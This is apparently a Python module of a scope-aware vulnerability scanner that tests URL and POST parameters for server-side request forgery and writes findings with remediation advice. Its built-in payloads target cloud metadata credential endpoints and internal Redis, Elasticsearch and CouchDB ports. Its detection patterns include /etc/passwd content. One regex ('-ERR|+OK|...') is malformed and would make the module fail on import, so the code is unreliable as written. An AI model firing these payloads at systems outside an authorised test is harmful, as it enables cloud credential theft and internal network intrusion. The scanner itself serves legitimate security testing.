"""SSRF — cloud metadata + internal service probes, scope-aware, GET + POST."""

from __future__ import annotations

import re
import uuid
import urllib.parse
from pathlib import Path

from dribik.models import CVSSVector, Finding, Scope
from dribik.scanner import http_get, http_post
from dribik.scope import classify


def _load_payloads() -> list[str]:
    p = Path(__file__).parent.parent / "payloads" / "ssrf.txt"
    if p.exists():
        return [ln.strip() for ln in p.read_text(encoding="utf-8").splitlines()
                if ln.strip() and not ln.startswith("#")]
    return _BUILTIN


_BUILTIN = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "http://localhost/",
    "http://127.0.0.1/",
    "http://0.0.0.0/",
    "http://localhost:6379/",
    "http://localhost:9200/",
    "http://localhost:5984/",
]

_HIT_PATTERNS = [
    re.compile(r"ami-id|instance-id|local-ipv4|security-credentials|iam", re.I),
    re.compile(r"computeMetadata|serviceAccounts", re.I),
    re.compile(r"-ERR|+OK|WRONGTYPE|NOAUTH", re.I),        # Redis
    re.compile(r'"version"\s*:\s*"\d+\.\d+\.\d+"', re.I),  # Elasticsearch/CouchDB
    re.compile(r"root:x:0:0", re.I),                        # /etc/passwd via file://
]

_SSRF_PARAMS = [
    "url", "uri", "endpoint", "redirect", "proxy", "fetch", "load",
    "href", "src", "dest", "target", "callback", "request", "site",
    "return", "image", "host", "server", "forward",
]


def _is_ssrf_hit(body: str) -> bool:
    return any(p.search(body) for p in _HIT_PATTERNS)


def _inject_get(url: str, param: str, payload: str) -> str:
    parsed = urllib.parse.urlsplit(url)
    qp = dict(urllib.parse.parse_qsl(parsed.query))
    qp[param] = payload
    return urllib.parse.urlunsplit(parsed._replace(query=urllib.parse.urlencode(qp)))


def _make_finding(param: str, url: str, payload: str, result, asset_id: str, injection_type: str) -> Finding:
    fid = f"SSRF-{uuid.uuid4().hex[:8].upper()}"
    return Finding(
        id=fid,
        title=f"SSRF via {injection_type} parameter '{param}'",
        severity="critical",
        vuln_type="SSRF",
        asset_id=asset_id or url,
        summary=(
            f"The {injection_type} parameter '{param}' allows the server to make requests to "
            f"arbitrary URLs. Payload '{payload}' returned metadata / internal service data."
        ),
        proof_of_concept=(
            f"Method: {injection_type}\nURL: {url}\n"
            f"Parameter: {param}\nPayload: {payload}\n"
            f"Response status: {result.status}\n"
            f"Body (first 300): {result.body[:300]}"
        ),
        remediation=(
            "Validate all URLs against a strict allowlist of permitted schemes and hosts. "
            "Block access to link-local and loopback addresses (169.254.x.x, 127.x.x.x). "
            "Reject non-HTTP schemes (file://, dict://, gopher://)."
        ),
        references=[
            "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
            "https://portswigger.net/web-security/ssrf",
        ],
        cwe_id="CWE-918",
        cvss=CVSSVector(vector_string="AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N"),
        response_diff_agreement=1.0,
    )


def scan_ssrf(
    url: str,
    *,
    params: list[str] | None = None,
    payloads: list[str] | None = None,
    timeout: int = 10,
    asset_id: str = "",
    scope: Scope | None = None,
    test_post: bool = True,
) -> list[Finding]:
    """Probe GET params and POST body for SSRF vulnerabilities."""
    if scope and classify(scope, url) != "allow":
        return []

    if payloads is None:
        payloads = _load_payloads()

    parsed = urllib.parse.urlsplit(url)
    existing = list(dict(urllib.parse.parse_qsl(parsed.query)).keys())
    probe_params = params or list(dict.fromkeys(existing + _SSRF_PARAMS))

    findings: list[Finding] = []
    seen: set[str] = set()

    for param in probe_params:
        for payload in payloads:
            # GET
            dedup_get = f"ssrf:get:{param}"
            if dedup_get not in seen:
                injected = _inject_get(url, param, payload)
                result = http_get(injected, timeout=timeout)
                if not result.error and _is_ssrf_hit(result.body):
                    seen.add(dedup_get)
                    findings.append(_make_finding(param, injected, payload, result, asset_id, "GET query"))
                    continue

            # POST
            if test_post:
                dedup_post = f"ssrf:post:{param}"
                if dedup_post not in seen:
                    result = http_post(url, data={param: payload}, timeout=timeout)
                    if not result.error and _is_ssrf_hit(result.body):
                        seen.add(dedup_post)
                        findings.append(_make_finding(param, url, payload, result, asset_id, "POST body"))

    return findings
